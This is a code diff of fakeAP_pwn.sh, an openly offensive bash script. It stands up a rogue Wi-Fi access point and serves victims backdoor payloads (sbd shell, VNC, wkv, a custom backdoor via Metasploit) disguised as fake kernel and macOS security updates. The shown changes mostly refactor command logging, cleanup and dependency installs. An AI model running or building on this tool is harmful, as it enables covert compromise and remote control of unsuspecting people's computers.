@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh v0.3 (Beta-#70 2010-07-30)                                                     #
+# fakeAP_pwn.sh v0.3 (Beta-#71 2010-07-30)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -70,7 +70,7 @@ verbose=0
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP="127.0.0.1" # 10.0.0.1?
      port=$(shuf -i 2000-65000 -n 1)
-  version="0.3 (Beta-#70)"
+  version="0.3 (Beta-#71)"
       www="${www%/}"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 
@@ -79,8 +79,10 @@ function cleanup() {
    if [ "$1" == "user" ] ; then exit 3 ; fi
    echo
    echo -e "\e[01;32m[>]\e[00m Cleaning up..."
-   if [ "$diagnostics" == "true" ] ; then echo "-Cleaning up-----------------------------" >> fakeAP_pwn.output; fi
-   if [ "$1" != "clean" ] ; then $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "killall xterm" ; fi
+   if [ "$diagnostics" == "true" ] ; then echo -e "\n-Cleaning up---------------------------------------------------------------------------------" >> fakeAP_pwn.log; fi
+   if [ "$1" != "clean" ] ; then
+      action "Killing xterm" "killall xterm" $verbose $diagnostics "true" $debug
+   fi
    if [ "$debug" != "true" ] && [ "$diagnostics" != "true" ] ; then
       if [ -e /tmp/fakeAP_pwn.rb ] ;       then rm /tmp/fakeAP_pwn.rb; fi
       if [ -e /tmp/fakeAP_pwn.dhcp ] ;     then rm /tmp/fakeAP_pwn.dhcp; fi
@@ -92,10 +94,8 @@ function cleanup() {
       if [ -e /tmp/fakeAP_pwn.ssl ] ;      then rm /tmp/fakeAP_pwn.ssl; fi
       if [ -e /tmp/hostapd.dump ] ;        then rm /tmp/hostapd.dump; fi
       if [ -e /etc/apache2/sites-available/fakeAP_pwn ]; then # We may want to give apahce running when in "non" mode. - to show a different page!
-         command="ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && a2dismod ssl && /etc/init.d/apache2 stop"
-         if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-         $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restoring apache" -e "$command"
-         rm /etc/apache2/sites-available/fakeAP_pwn
+         action "Restoring apache" "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && a2dismod ssl && /etc/init.d/apache2 stop" $verbose $diagnostics "true" $debug
+         action "Restoring apache" "rm /etc/apache2/sites-available/fakeAP_pwn" $verbose $diagnostics "true" $debug
       fi
       if [ -e $www/kernal_1.83.90-5+lenny2_i386.deb ] ; then rm $www/kernal_1.83.90-5+lenny2_i386.deb; fi
       if [ -e $www/SecurityUpdate1-83-90-5.dmg.bin ] ;  then rm $www/SecurityUpdate1-83-90-5.dmg.bin; fi
@@ -107,13 +107,12 @@ function cleanup() {
          if [ "$command" == "$monitorInterface" ] ; then
             sleep 3 # Some times it needs to catch up/wait
             command="airmon-ng stop $monitorInterface"
-            if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-            $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "$command"
+            action "Monitor Mode (Stopping)" "$command" $verbose $diagnostics "true" $debug
          fi
       fi
    fi
    if [ "$apMode" == "non" ] ; then # Else will will remove their internet access!
-      if [ `echo route | egrep "10.0.0.0"` ] ; then route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1; fi
+      if [ $(echo route | grep "10.0.0.0") ] ; then route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1; fi
       iptables --flush        # remove existing rules
       iptables --delete-chain
       iptables --zero
@@ -121,7 +120,7 @@ function cleanup() {
    fi
    # ubuntu fixes
    #command="service network-manager start"
-   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
+   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
    #$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Starting 'network-manager'" -e "$command" # Start network-manager
    if [ -e /etc/apparmor.d/usr.sbin.dhcpd3.bkup ]; then mv -f /etc/apparmor.d/usr.sbin.dhcpd3.bkup /etc/apparmor.d/usr.sbin.dhcpd3; fi # Fixes folder persmissions
 
@@ -207,7 +206,7 @@ function update() {
 }
 
 function testAP() {
-   if [ "$1" == "" ] ||  [ "$2" == "" ] ; then return 1; fi # Coding error
+   if [ "$1" == "" ] ||  [ "$2" == "" ] ; then return 1; fi # Coding error ($1 = ESSID, $2 = $wiFiinterface)
    eval list=( $(iwlist $2 scan 2>/dev/null | awk -F":" '/ESSID/{print $2}') )
    if [ -z "${list[0]}" ]; then
       return 2 # Couldn't detect a single AP
@@ -218,8 +217,54 @@ function testAP() {
    return 3 # Couldn't find the fake AP
 }
 
+function action() {
+   # action title command verbose diagnostics screen&file debug x y lines
+   # action "Resetting interface" "$command" $verbose $diagnostics "true" $debug
+   # action "Resetting interface" "$command" $verbose $diagnostics "true" $debug 10 5 22
+   error="free"
+   if [ "$1" == "" ] ||  [ "$2" == "" ] ||  [ "$3" == "" ] ||  [ "$4" == "" ] || [ "$5" == "" ] || [ "$6" == "" ] ; then error="1" ; fi # Coding error
+   if [ "$3" != "0" ] && [ "$3" != "1" ] && [ "$3" != "2" ]; then error="3"; fi # Coding error
+   if [ "$4" != "true" ] && [ "$4" != "false" ] ; then error="4"; fi # Coding error
+   if [ "$5" != "true" ] && [ "$5" != "false" ] ; then error="5"; fi # Coding error
+   if [ "$6" != "true" ] && [ "$6" != "false" ] ; then error="6"; fi # Coding error
+   if [ "$error" == "free" ] ; then
+      xterm="xterm"
+      command=$2
+      x="100"
+      y="0"
+      lines=15
+      if [ "$6" == "true" ] ; then xterm="$xterm -hold" ; fi
+      if [ "$3" == "2" ] ; then echo "Command: $command" ; fi
+      if [ "$4" == "true" ] ; then
+         echo "---------------------------------------------------------------------------------------------" >> fakeAP_pwn.log
+         echo "$1~Command: $command" >> fakeAP_pwn.log
+      fi
+      if [ "$5" == "true" ] ; then command="$command | tee -a fakeAP_pwn.log" ; fi
+      if [ "$7" != "" ] ; then     x=$7; fi
+      if [ "$8" != "" ] ; then     y=$8; fi
+      if [ "$9" != "" ] ; then lines=$9; fi
+      $xterm -geometry 75x$lines+$x+$y -T "fakeAP_pwn v$version - $1" -e "$command"
+      return 0
+   else
+#print error commands
+      echo -e "\e[00;31m[-]\e[00m Error running command. Error code: $error"
+      echo "---------------------------------------------------------------------------------------------
+-->ERROR: action $1 , $2 , $3 , $4 , $5 , $6 , $7 , $8 , $9" >> fakeAP_pwn.log;
+      return 1
+   fi
+}
+
 #----------------------------------------------------------------------------------------------#
 echo -e "\e[01;36m[*]\e[00m fakeAP_pwn v$version"
+
+if [ -e /tmp/fakeAP_pwn.wkv ] ; then rm /tmp/fakeAP_pwn.wkv; fi
+if [ -e fakeAP_pwn.log ] ;   then rm fakeAP_pwn.log; fi
+
+echo "fakeAP_pwn v$version
+$(date)
+---------------------------------------------------------------------------------------------" > fakeAP_pwn.log
+
+if [ "$(id -u)" != "0" ] ; then echo -e "\e[00;31m[-]\e[00m Not a superuser." 1>&2; cleanup user; fi
 
 while getopts "i:w:m:e:c:y:o:p:b:h:t:rz:a:xdDvVu?" OPTIONS; do
   case ${OPTIONS} in
@@ -247,26 +292,22 @@ while getopts "i:w:m:e:c:y:o:p:b:h:t:rz:a:xdDvVu?" OPTIONS; do
     *     ) echo -e "\e[00;31m[-]\e[00m Unknown option.";;   # DEFAULT
   esac
 done
-#----------------------------------------------------------------------------------------------#
-echo -e "\e[01;32m[>]\e[00m Checking environment..."
 
-if [ "$(id -u)" != "0" ] ; then echo -e "\e[00;31m[-]\e[00m Not a superuser." 1>&2; cleanup user; fi
-
-export xterm="xterm"
 if [ "$debug" == "true" ] ; then
    echo -e "\e[01;33m[i]\e[00m Debug Mode\e[00m"
-   export xterm="xterm -hold"
 elif [ "$diagnostics" == "true" ] ; then
    echo -e "\e[01;34m[i]\e[00m Diagnostics Mode\e[00m"
 fi
 
+#----------------------------------------------------------------------------------------------#
+echo -e "\e[01;32m[>]\e[00m Checking environment..."
 
 if [ "$wifiInterface" == "" ] ; then echo -e "\e[00;31m[-]\e[00m wifiInterface can't be blank" 1>&2; cleanup; fi
 command=$(iwconfig $wifiInterface 2>/dev/null | grep "802.11" | cut -d" " -f1)
 if [ ! $command ]; then
    echo -e "\e[01;33m[i]\e[00m $wifiInterface isn't a wireless interface."
    echo -e "\e[01;33m[i]\e[00m Searching for a wireless interface"
-   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d" " -f1)
+   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d" " -f1) #| awk '!/"'"$interface"'"/'
    if [ $command ] ; then
       wifiInterface=$command
       echo -e "\e[01;33m[i]\e[00m Found $wifiInterface"
@@ -280,11 +321,15 @@ if [ "$apMode" != "non" ] ; then
    if [ "$interface" == "" ] ; then echo -e "\e[00;31m[-]\e[00m interface can't be blank" 1>&2; cleanup; fi
    if [ "$interface" == "$wifiInterface" ] ; then echo -e "\e[00;31m[-]\e[00m interface and wifiInterface can't be the same!" 1>&2; cleanup; fi
    if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then echo -e "\e[01;34m[i]\e[00m Testing internet connection"; fi
-   command=$( ping -I $interface -c 1 google.com 2>/dev/null)
-   if [ ! $command ]; then
-      echo -e "\e[00;31m[-]\e[00m Couldn't find a internet connection."
-      echo -e "\e[01;33m[i]\e[00m Switching apMode to: Non"
+   if [ "$diagnostics" == "true" ] ; then echo "-Testing Internet Access---------------------------------------------------------------------" >> fakeAP_pwn.log; fi
+   command=$(ping -I $interface -c 1 google.com >/dev/null)
+   if ! eval $command ; then
+      echo -e "\e[00;31m[-]\e[00m Internet access test: Failed."
+      echo -e "\e[01;33m[i]\e[00m Switching apMode to: non (No Internet access after infection)"
       apMode="non"
+      if [ "$diagnostics" == "true" ] ; then echo "--> Internet access test: Failed." >> fakeAP_pwn.log; fi
+   else
+      if [ "$diagnostics" == "true" ] ; then echo "--> Internet access test: Okay." >> fakeAP_pwn.log; fi
    fi
    ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
 fi
@@ -294,9 +339,6 @@ if [ "$apType" == "airbase-ng" ] ; then
 else
    apInterface=$wifiInterface
 fi
-
-if [ -e /tmp/fakeAP_pwn.wkv ] ; then rm /tmp/fakeAP_pwn.wkv; fi
-if [ -e fakeAP_pwn.output ] ;   then rm fakeAP_pwn.output; fi
 
 if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
     echo -e "\e[01;33m[i]\e[00m        interface=$interface
@@ -324,9 +366,8 @@ if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
 fi
 
 if [ "$diagnostics" == "true" ] ; then
-    echo "fakeAP_pwn v$version
-$(date)
--Variables-------------------------------
+    echo "
+-Settings------------------------------------------------------------------------------------
         interface=$interface
     wifiInterface=$wifiInterface
  monitorInterface=$monitorInterface
@@ -349,35 +390,34 @@ $(date)
         gatewayIP=$gatewayIP
             ourIP=$ourIP
              port=$port
--Environment-----------------------------" >> fakeAP_pwn.output
-    echo "-Kernal----------------------------------" >> fakeAP_pwn.output
+-Environment--------------------------------------------------------------------------------
+-Kernal----------------------------------" >> fakeAP_pwn.log
     echo -e "\e[01;34m[i]\e[00m Finding kernal version"
-    uname -a >> fakeAP_pwn.output
-    echo "-Hardware--------------------------------" >> fakeAP_pwn.output
+    uname -a >> fakeAP_pwn.log
+    echo "-Hardware--------------------------------" >> fakeAP_pwn.log
     echo -e "\e[01;34m[i]\e[00m Finding hardware infomation"
-    lspci -knn >> fakeAP_pwn.output
-    echo "-Network---------------------------------" >> fakeAP_pwn.output
+    lspci -knn >> fakeAP_pwn.log
+    echo "-Network---------------------------------" >> fakeAP_pwn.log
     echo -e "\e[01;34m[i]\e[00m Finding network infomation"
-    ifconfig >> fakeAP_pwn.output
-    echo "-----------------------------------------" >> fakeAP_pwn.output
-    ifconfig -a >> fakeAP_pwn.output
+    ifconfig >> fakeAP_pwn.log
+    echo "-----------------------------------------" >> fakeAP_pwn.log
+    ifconfig -a >> fakeAP_pwn.log
     if [ "$apMode" != "non" ] ; then
-        echo "-Ping------------------------------------" >> fakeAP_pwn.output
+        echo "-Ping------------------------------------" >> fakeAP_pwn.log
         echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 $ourIP"
-        ping -I $interface -c 4 $ourIP >> fakeAP_pwn.output
-        echo "-----------------------------------------" >> fakeAP_pwn.output
+        ping -I $interface -c 4 $ourIP >> fakeAP_pwn.log
+        echo "-----------------------------------------" >> fakeAP_pwn.log
         echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 $gatewayIP"
-        ping -I $interface -c 4 $gatewayIP >> fakeAP_pwn.output
-        echo "-----------------------------------------" >> fakeAP_pwn.output
+        ping -I $interface -c 4 $gatewayIP >> fakeAP_pwn.log
+        echo "-----------------------------------------" >> fakeAP_pwn.log
         echo -e "\e[01;34m[i]\e[00m ping -I $interface -c 4 google.com"
-        command=$(ping -I $interface -c 4 google.com >> fakeAP_pwn.output)
+        command=$(ping -I $interface -c 4 google.com >> fakeAP_pwn.log)
         if eval $command; then
-           echo "-->Active Internet connection" >> fakeAP_pwn.output
+           echo "-->Active Internet connection" >> fakeAP_pwn.log
         else
-           echo "-->No internet available" >> fakeAP_pwn.output
+           echo "-->No internet available" >> fakeAP_pwn.log
         fi
     fi
-    echo "*Commands********************************" >> fakeAP_pwn.output
 fi
 
 if [ "$ESSID" == "" ] ; then echo -e "\e[00;31m[-]\e[00m ESSID can't be blank" 1>&2; cleanup; fi
@@ -388,7 +428,7 @@ if [ "$payload" == "" ] && [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] &&
 if [ "$apMode" == "" ] && [ "$apMode" != "normal" ] && [ "$apMode" != "transparent" ] && [ "$apMode" != "non" ] ; then echo -e "\e[00;31m[-]\e[00m apMode isn't correct" 1>&2; cleanup; fi
 if [ "$respond2All" == "" ] && [ "$respond2All" != "true" ] && [ "$respond2All" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m respond2All isn't correct" 1>&2; cleanup; fi
 if [ "$fakeAPmac" == "" ] && [ "$fakeAPmac" != "random" ] && [ "$fakeAPmac" != "set" ] && [ "$fakeAPmac" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m fakeAPmac isn't correct" 1>&2; cleanup; fi
-if [ "$macAddress" == "" ] && ! [ `echo $macAddress | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$"` ] ; then echo -e "\e[00;31m[-]\e[00m macAddress isn't correct" 1>&2; cleanup; fi
+if [ "$macAddress" == "" ] && ! [ $(echo $macAddress | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ] ; then echo -e "\e[00;31m[-]\e[00m macAddress isn't correct" 1>&2; cleanup; fi
 if [ "$extras" == "" ] &&  [ "$extras" != "true" ] && [ "$extras" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m extras isn't correct" 1>&2; cleanup; fi
 if [ "$debug" == "" ] && [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m debug isn't correct" 1>&2; cleanup; fi
 if [ "$diagnostics" == "" ] && [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then echo -e "\e[00;31m[-]\e[00m debug isn't correct" 1>&2; cleanup; fi
@@ -398,8 +438,7 @@ if [ ! -e "$www/index.php" ] ; then
    if [ -d "$www/" ] ; then
       mkdir -p $www
       command="cp -rf www/* $www/"
-      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Copying www/" -e "$command"
+      action "Copying www/" "$command" $verbose $diagnostics "true" $debug # Stopping wicd to prevent channel hopping
    fi
    if [ ! -e "$www/index.php" ] ; then
       echo -e "\e[00;31m[-]\e[00m Missing index.php. Did you run: cp -rf www/* $www/" 1>&2
@@ -413,13 +452,13 @@ if [ "$apType" == "airbase-ng" ] ; then
       echo -e "\e[00;31m[-]\e[00m aircrack-ng isn't installed."
       read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
       if [[ $REPLY =~ ^[Yy]$ ]] ; then
-         command=$(apt-get -y install aircrack-ng)
+         action "Install aircrack-ng" "apt-get -y install aircrack-ng" $verbose $diagnostics "true" $debug
       fi
       if [ ! -e /usr/sbin/airmon-ng ] && [ ! -e /usr/local/sbin/airmon-ng ] ; then
          echo -e "\e[00;31m[-]\e[00m Failed to install aircrack-ng" 1>&2;
          cleanup;
       else
-         echo -e "\e[01;33m[i]\e[00m Install aircrack-ng"
+         echo -e "\e[01;33m[i]\e[00m Installed aircrack-ng"
       fi
    fi
 elif [ "$apType" == "hostapd" ] ; then
@@ -427,7 +466,7 @@ elif [ "$apType" == "hostapd" ] ; then
       echo -e "\e[00;31m[-]\e[00m hostapd isn't installed."
       read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
       if [[ $REPLY =~ ^[Yy]$ ]] ; then
-         command=$(apt-get -y install hostapd)
+         action "Install hostapd" "apt-get -y install hostapd" $verbose $diagnostics "true" $debug
 #wget http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz
 #tar zxvf libnl-1.1.tar.gz && rm libnl-1.1.tar.gz
 #libnl-1.1/
@@ -446,7 +485,7 @@ elif [ "$apType" == "hostapd" ] ; then
       echo -e "\e[00;31m[-]\e[00m Failed to install hostapd." 1>&2;
       cleanup;
       else
-         echo -e "\e[01;33m[i]\e[00m Install hostapd."
+         echo -e "\e[01;33m[i]\e[00m Installed hostapd."
       fi
    fi
 fi
@@ -454,13 +493,13 @@ if [ ! -e /usr/bin/macchanger ] ; then
    echo -e "\e[00;31m[-]\e[00m macchanger isn't installed."
    read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
    if [[ $REPLY =~ ^[Yy]$ ]] ; then
-      command=$(apt-get -y install macchanger)
+      action "Install macchanger" "apt-get -y install macchanger" $verbose $diagnostics "true" $debug
    fi
    if [ ! -e /usr/bin/macchanger ] ; then
       echo -e "\e[00;31m[-]\e[00m Failed to install macchanger" 1>&2;
       cleanup;
    else
-      echo -e "\e[01;33m[i]\e[00m Install macchanger"
+      echo -e "\e[01;33m[i]\e[00m Installed macchanger"
    fi
 fi
 if [ ! -e /usr/sbin/dhcpd3 ] ; then
@@ -468,25 +507,26 @@ if [ ! -e /usr/sbin/dhcpd3 ] ; then
    read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
    if [[ $REPLY =~ ^[Yy]$ ]] ; then
       command=$(apt-get -y install dhcp3-server)
+      action "Install macchanger" "apt-get -y install dhcp3-server" $verbose $diagnostics "true" $debug
    fi
    if [ -e /usr/sbin/dhcpd3 ] ; then
       echo -e "\e[00;31m[-]\e[00m Failed to install dhcpd3" 1>&2;
       cleanup;
    else
-      echo -e "\e[01;33m[i]\e[00m Install dhcpd3"
+      echo -e "\e[01;33m[i]\e[00m Installed dhcpd3"
    fi
 fi
 if [ ! -e /usr/sbin/apache2 ] ; then
    echo -e "\e[00;31m[-]\e[00m apache2 isn't installed."
    read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
    if [[ $REPLY =~ ^[Yy]$ ]] ; then
-      command=$(apt-get -y install apache2 php5)
+      action "Install macchanger" "apt-get -y install apache2 php5" $verbose $diagnostics "true" $debug
    fi
    if [ ! -e /usr/sbin/apache2 ] ; then
       echo -e "\e[00;31m[-]\e[00m Failed to install apache2" 1>&2;
       cleanup;
    else
-      echo -e "\e[01;33m[i]\e[00m Install apache2 & php5"
+      echo -e "\e[01;33m[i]\e[00m Installed apache2 & php5"
    fi
 fi
 if [ "$payload" == "sbd" ] ; then
@@ -495,12 +535,13 @@ if [ "$payload" == "sbd" ] ; then
       read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
       if [[ $REPLY =~ ^[Yy]$ ]] ; then
          command=$(apt-get -y install sbd)
+      action "Install macchanger" "apt-get -y install sbd" $verbose $diagnostics "true" $debug
       fi
       if [ ! -e /usr/local/bin/sbd ] ; then
          echo -e "\e[00;31m[-]\e[00m Failed to install sbd" 1>&2;
          cleanup;
       else
-         echo -e "\e[01;33m[i]\e[00m Install sbd"
+         echo -e "\e[01;33m[i]\e[00m Installed sbd"
       fi
    fi
 elif [ "$payload" == "vnc" ] ; then
@@ -508,35 +549,35 @@ elif [ "$payload" == "vnc" ] ; then
       echo -e "\e[00;31m[-]\e[00m vnc isn't installed."
       read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
       if [[ $REPLY =~ ^[Yy]$ ]] ; then
-         command=$(apt-get -y install vnc)
+         action "Install macchanger" "apt-get -y install vnc" $verbose $diagnostics "true" $debug
       fi
       if [ ! -e /usr/bin/vncviewer ] ; then
          echo -e "\e[00;31m[-]\e[00m Failed to install vnc" 1>&2;
          cleanup;
       else
-         echo -e "\e[01;33m[i]\e[00m Install vnc"
+         echo -e "\e[01;33m[i]\e[00m Installed vnc"
       fi
    fi
 elif [ "$payload" == "wkv" ] ; then
-   if ! [ -e "$www/wkv-x86.exe" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a wkv-x86.exe at $www/wkv-x86.exe." 1>&2; cleanup; fi
-   if ! [ -e "$www/wkv-x64.exe" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a wkv-x64.exe at $www/wkv-x64.exe." 1>&2; cleanup; fi
+   if [ ! -e "$www/wkv-x86.exe" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a wkv-x86.exe at $www/wkv-x86.exe." 1>&2; cleanup; fi
+   if [ ! -e "$www/wkv-x64.exe" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a wkv-x64.exe at $www/wkv-x64.exe." 1>&2; cleanup; fi
 else
-   if ! [ -e "$backdoorPath" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a backdoor at $backdoorPath." 1>&2; cleanup; fi
+   if [ ! -e "$backdoorPath" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a backdoor at $backdoorPath." 1>&2; cleanup; fi
 fi
 if [ ! -e /opt/metasploit3/bin/msfconsole ] ; then
    echo -e "\e[00;31m[-]\e[00m Metasploit isn't installed."
    read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
    if [[ $REPLY =~ ^[Yy]$ ]] ; then
-      command=$(apt-get -y install framework3)
+      action "Install macchanger" "apt-get -y install framework3" $verbose $diagnostics "true" $debug
    fi
    if [ ! -e /opt/metasploit3/bin/msfconsole ] ; then
-      command=$(apt-get -y install metasploit)
+      action "Install macchanger" "apt-get -y install metasploit" $verbose $diagnostics "true" $debug
    fi
    if [ ! -e /opt/metasploit3/bin/msfconsole ] ; then
       echo -e "\e[00;31m[-]\e[00m Failed to install metasploit" 1>&2;
       cleanup;
    else
-      echo -e "\e[01;33m[i]\e[00m Install metasploit"
+      echo -e "\e[01;33m[i]\e[00m Installed metasploit"
    fi
 fi
 if [ "$extras" == "true" ] ; then
@@ -545,12 +586,13 @@ if [ "$extras" == "true" ] ; then
       read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
       if [[ $REPLY =~ ^[Yy]$ ]] ; then
          command=$(apt-get -y install imsniff)
+         action "Install macchanger" "apt-get -y install imsniff" $verbose $diagnostics "true" $debug
       fi
       if [ ! -e /usr/bin/imsniff ] ; then
          echo -e "\e[00;31m[-]\e[00m Failed to install imsniff" 1>&2;
          cleanup;
       else
-         echo -e "\e[01;33m[i]\e[00m Install imsniff"
+         echo -e "\e[01;33m[i]\e[00m Installed imsniff"
       fi
    fi
 fi
@@ -558,8 +600,7 @@ fi
 if [ "$apMode" != "non" ] ; then
    command="ifconfig $interface up && sleep 1" #command="ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" fails if you dont have DHCP
 #if [ ! $(ifconfig | grep -o -q "$interface") == "" ] ; then echo "Stil down" cleanup; fi # check to make sure $interface came up!
-   if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-   $xterm -geometry 75x15+100+0 -T "fakeAP_pwn v$version - Resetting interface" -e "$command"
+  action "Resetting interface" "$command" $verbose $diagnostics "true" $debug
    command=$(ifconfig | grep $interface | awk '{print $1}')
    if [ "$command" != "$interface" ] ; then
       echo -e "\e[00;31m[-]\e[00m The gateway interface $interface, isn't correct." 1>&2
@@ -568,8 +609,7 @@ if [ "$apMode" != "non" ] ; then
    fi
    if [ -z "$ourIP" ] ; then
       command="dhclient $interface"
-      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x15+100+0 -T "fakeAP_pwn v$version - Acquiring an IP Address" -e "$command"
+      action "Acquiring an IP Address" "$command" $verbose $diagnostics "true" $debug
       sleep 3
       ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
       if [ -z "$ourIP" ] ; then
@@ -601,21 +641,16 @@ fi
 
 #----------------------------------------------------------------------------------------------#
 if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then echo -e "\e[01;32m[>]\e[00m Stopping services and programs..." ; fi
-command="killall dhcpd3 apache2 wicd-client airbase-ng hostapd"
-if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Programs'"        -e "$command" # Killing "wicd-client" to prevent channel hopping
+command="killall dhcpd3 apache2 wicd-client airbase-ng hostapd" # Killing "wicd-client" to prevent channel hopping
+action "Killing 'Programs'" "$command" $verbose $diagnostics "true" $debug
 command="/etc/init.d/dhcp3-server stop"
-if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'DHCP3 Service'"   -e "$command" # Stop DHCP
+action "Killing 'DHCP3 Service'" "$command" $verbose $diagnostics "true" $debug
 command="/etc/init.d/apache2 stop"
-if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Apache2 Service'" -e "$command" # Stop Web Server
+action "Killing 'Apache2 Service'" "$command" $verbose $diagnostics "true" $debug
 command="/etc/init.d/wicd stop"
-if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'wicd Service'"    -e "$command" # Stopping wicd to prevent channel hopping
+action "Killing 'wicd Service'" "$command" $verbose $diagnostics "true" $debug # Stopping wicd to prevent channel hopping
 #command="service network-manager stop"
-#if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-#$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "$command" # Stop network-manager (Ubuntu)
+#action "Killing 'network-manager'" "$command" $verbose $diagnostics "true" $debug # Stop network-manager (Ubuntu)
 
 #----------------------------------------------------------------------------------------------#
 echo -e "\e[01;32m[>]\e[00m Setting up wireless card..."
@@ -623,35 +658,31 @@ if [ "$apType" == "airbase-ng" ] ; then
    command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
    if [ "$command" == "$monitorInterface" ] ; then
       command="airmon-ng stop $monitorInterface"
-      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "$command"
+      if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
+      action "Monitor Mode (Stopping)" "$command" $verbose $diagnostics "true" $debug
       sleep 1
    fi
 fi
 command="ifconfig $wifiInterface down"
-if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.output; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Bringing down $wifiInterface" -e "$command" &
+action "Bringing down $wifiInterface" "$command" $verbose $diagnostics "true" $debug
 sleep 1
 command="ifconfig $wifiInterface up"
+action "Bringing up $wifiInterface" "$command" $verbose $diagnostics "true" $debug
 #if [ ! $(ifconfig | grep -o -q "$interface") == "" ] ; then echo "Stil down" cleanup; fi # check to make sure $interface came up!
